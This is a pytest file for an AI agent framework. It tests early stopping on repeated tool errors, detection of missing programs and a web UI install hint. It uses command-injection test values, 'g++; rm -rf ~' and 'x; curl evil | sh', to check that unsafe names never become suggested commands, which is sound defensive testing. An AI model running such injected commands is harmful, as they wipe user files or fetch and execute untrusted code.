"""Stop early on a repeated tool error (D152), and the plain "install it" hint in the web UI.

FakeProvider behind the real guarded gateway; no network, no real model API.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from automa.agents import WorkerSettings
from automa.agents.worker import NOT_RUN_AFTER_REPEAT, REPEATED_ERROR
from automa.config import Tier
from automa.plan import Plan, ResultStatus, TaskResult
from automa.project import ProjectStore
from automa.tools.base import ToolResult
from automa.tools.missing import APT_PACKAGES, install_command, missing_program
from automa.webui import build_project_view, render_project
from automa.webui.render import _task_card
from automa.webui.views import TaskRow, task_rows
from test_webui import _task
from test_worker import PID, Rig, calls, make_task

MISSING = {"argv": ["no-such-program-d152", "x.cpp"]}


# --- worker ------------------------------------------------------------------


def test_same_error_twice_in_a_row_stops_the_attempt(tmp_path: Path) -> None:
    rig = Rig(tmp_path, [calls(("run_command", MISSING)) for _ in range(20)])
    result = rig.run()
    assert result.status is ResultStatus.FAILED
    assert result.steps == 2
    assert len(rig.provider.requests) == 2  # no third paid call
    assert rig.provider.remaining == 18
    assert (result.error or "").startswith(REPEATED_ERROR)
    assert "2 times in a row from run_command" in (result.error or "")
    assert "program not found: 'no-such-program-d152'" in (result.error or "")
    assert missing_program(result.error) == "no-such-program-d152"
    events = [e for e in rig.events.events if e.type == "worker.repeated_error"]
    assert len(events) == 1
    assert events[0].data == {
        "task": "t1",
        "attempt": 1,
        "step": 2,
        "tool": "run_command",
        "times": 2,
        "missing_program": "no-such-program-d152",
    }
    assert rig.types()[-1] == "worker.finished"


def test_cost_is_still_recorded_for_the_stopped_attempt(tmp_path: Path) -> None:
    rig = Rig(tmp_path, [calls(("run_command", MISSING)) for _ in range(5)])
    result = rig.run()
    assert result.cost_nusd > 0
    assert result.cost_nusd == sum(r.cost_nusd for r in rig.ledger.entries(project_id=PID))


def test_success_in_between_resets_the_count(tmp_path: Path) -> None:
    script = [
        calls(("run_command", MISSING)),
        calls(("list_dir", {})),
        calls(("run_command", MISSING)),
        calls(("list_dir", {})),
        "gave up: compiler missing",
    ]
    rig = Rig(tmp_path, script)
    result = rig.run()
    assert result.status is ResultStatus.COMPLETED
    assert not any(e.type == "worker.repeated_error" for e in rig.events.events)


def test_different_errors_do_not_stop(tmp_path: Path) -> None:
    script = [
        calls(("run_command", MISSING)),
        calls(("run_command", {"argv": ["other-missing-d152"]})),
        calls(("read_file", {"path": "nope.txt"})),
        "done",
    ]
    result = Rig(tmp_path, script).run()
    assert result.status is ResultStatus.COMPLETED


def test_same_tool_same_error_inside_one_reply_stops(tmp_path: Path) -> None:
    rig = Rig(
        tmp_path,
        [
            calls(
                ("run_command", MISSING),
                ("run_command", MISSING),
                ("write_file", {"path": "late.txt", "content": "x"}),
            ),
            "never asked",
        ],
    )
    result = rig.run()
    assert result.status is ResultStatus.FAILED and result.steps == 1
    assert len(rig.provider.requests) == 1
    # A call after the stop is not run and the file is not produced.
    assert not (rig.root / "late.txt").exists()
    assert result.files == []


def test_calls_after_the_repeat_are_answered_not_run(tmp_path: Path) -> None:
    # The conversation is not re-sent, but the bookkeeping must still give every
    # call a result; checked through the tool events: the late call never ran.
    rig = Rig(
        tmp_path,
        [calls(("run_command", MISSING), ("run_command", MISSING), ("list_dir", {}))],
    )
    rig.run()
    tools = [e.data.get("tool") for e in rig.tool_events.events if e.type == "tool.call"]
    assert tools == ["run_command", "run_command"]
    assert NOT_RUN_AFTER_REPEAT.startswith("ERROR: not run")


def test_same_error_from_another_tool_is_a_different_key(tmp_path: Path) -> None:
    script = [
        calls(("read_file", {"path": "missing.txt"})),
        calls(("list_dir", {"path": "missing.txt"})),
        "done",
    ]
    result = Rig(tmp_path, script).run()
    assert result.status is ResultStatus.COMPLETED


def test_denied_call_repeated_also_stops(tmp_path: Path) -> None:
    # A writer may not run commands: the same denial twice is the same waste.
    rig = Rig(tmp_path, [calls(("run_command", {"argv": ["ls"]})) for _ in range(5)])
    result = rig.run("writer", task=make_task("writer"))
    assert result.status is ResultStatus.FAILED and result.steps == 2
    assert missing_program(result.error) is None
    event = next(e for e in rig.events.events if e.type == "worker.repeated_error")
    assert "missing_program" not in event.data


def test_cut_off_calls_are_not_counted(tmp_path: Path) -> None:
    # Cut-off calls have their own remedy (more room, D142): never a repeat stop.
    script = [calls(("write_file", '{"path": "a.cpp"')) for _ in range(3)] + ["done"]
    result = Rig(tmp_path, script).run()
    assert result.status is ResultStatus.COMPLETED


def test_threshold_is_configurable(tmp_path: Path) -> None:
    rig = Rig(tmp_path, [calls(("run_command", MISSING)) for _ in range(10)])
    result = rig.run(agent_kw={"settings": WorkerSettings(stop_after_repeated_errors=4)})
    assert result.status is ResultStatus.FAILED and result.steps == 4
    assert "4 times in a row" in (result.error or "")


@pytest.mark.parametrize("bad", [0, 1, 21])
def test_threshold_bounds(bad: int) -> None:
    with pytest.raises(ValueError):
        WorkerSettings(stop_after_repeated_errors=bad)


def test_step_limit_still_wins_when_lower(tmp_path: Path) -> None:
    rig = Rig(tmp_path, [calls(("run_command", MISSING)) for _ in range(5)])
    result = rig.run(agent_kw={"settings": WorkerSettings(max_steps=1)})
    assert result.status is ResultStatus.STEP_LIMIT


# --- recognising "program not found" -------------------------------------------


@pytest.mark.parametrize(
    ("text", "name"),
    [
        ("program not found: 'g++'", "g++"),
        ("stopped early ... from run_command: program not found: 'g++'", "g++"),
        ("ERROR: program not found: 'python3'; command not run", "python3"),
        ("program not found: 'node'", "node"),
        ("program not found: '/usr/bin/g++'", None),  # a path: no suggestion
        ("program not found: 'g++; rm -rf ~'", None),
        ("program not found: 'a b'", None),
        ('program not found: "it\'s"', None),
        ("program not found: 'g++'x", None),
        ("program not found: ''", None),
        ("program not found: '-rf'", None),
        ("program is not executable: 'g++'", None),
        ("", None),
        (None, None),
    ],
)
def test_missing_program(text: str | None, name: str | None) -> None:
    assert missing_program(text) == name


def test_install_command() -> None:
    assert install_command("g++") == "sudo apt install -y g++"
    assert install_command("python") == "sudo apt install -y python3"
    assert install_command("node") == "sudo apt install -y nodejs"
    assert install_command("make") == "sudo apt install -y make"
    for program, package in APT_PACKAGES.items():
        assert missing_program(f"program not found: {program!r}") == program
        assert install_command(program).endswith(" " + package)
    for bad in ("g++; ls", "a b", "/bin/x", "", "-y"):
        with pytest.raises(ValueError):
            install_command(bad)


def test_real_run_command_error_is_recognised(tmp_path: Path) -> None:
    rig = Rig(tmp_path, [calls(("run_command", MISSING)), "done"])
    role = rig.roles.get("developer")
    result: ToolResult = rig.executor(role).execute("run_command", '{"argv": ["nope-d152"]}')
    assert missing_program(result.error) == "nope-d152"


# --- web UI ------------------------------------------------------------------


def _failed(error: str | None, status: ResultStatus = ResultStatus.FAILED) -> TaskResult:
    from test_webui import T0

    return TaskResult(
        task_id="a",
        attempt=1,
        status=status,
        tier=Tier.MEDIUM,
        model="fake-medium",
        error=error,
        started_at=T0,
        finished_at=T0,
    )


def _row(**kw: Any) -> TaskRow:
    return TaskRow(order=1, id="a", title="build", role="developer", **kw)


@pytest.mark.parametrize("lang", ["en", "fa"])
def test_task_card_shows_install_command(lang: Any) -> None:
    html = _task_card(_row(state="failed", missing_program="g++"), lang)
    assert '<code dir="ltr">sudo apt install -y g++</code>' in html
    assert "Ubuntu (WSL)" in html
    assert ("نصب نیست" in html) is (lang == "fa")


def test_task_card_without_missing_program_has_no_hint() -> None:
    assert "apt install" not in _task_card(_row(state="failed"), "en")


def test_task_rows_read_the_latest_failed_attempt(tmp_path: Path) -> None:
    store = ProjectStore.for_workspace(tmp_path)
    store.create("build it", project_id="p1")
    store.save_plan("p1", Plan(goal="build it", tasks=[_task("a")]))
    err = "stopped early: the same tool error came back 2 times in a row from run_command: "
    store.save_task_result("p1", _failed(err + "program not found: 'g++'"))
    (row,) = task_rows(store, "p1", store.load_plan("p1"))
    assert row.missing_program == "g++"
    html = render_project(build_project_view(store, "p1", 0))
    assert "sudo apt install -y g++" in html


def test_completed_attempt_shows_no_install_hint(tmp_path: Path) -> None:
    store = ProjectStore.for_workspace(tmp_path)
    store.create("build it", project_id="p1")
    store.save_plan("p1", Plan(goal="build it", tasks=[_task("a")]))
    store.save_task_result("p1", _failed("program not found: 'g++'", status=ResultStatus.COMPLETED))
    (row,) = task_rows(store, "p1", store.load_plan("p1"))
    assert row.missing_program is None


def test_unsafe_recorded_name_never_becomes_a_command(tmp_path: Path) -> None:
    store = ProjectStore.for_workspace(tmp_path)
    store.create("build it", project_id="p1")
    store.save_plan("p1", Plan(goal="build it", tasks=[_task("a")]))
    store.save_task_result("p1", _failed("program not found: 'x; curl evil | sh'"))
    html = render_project(build_project_view(store, "p1", 0))
    assert "apt install" not in html
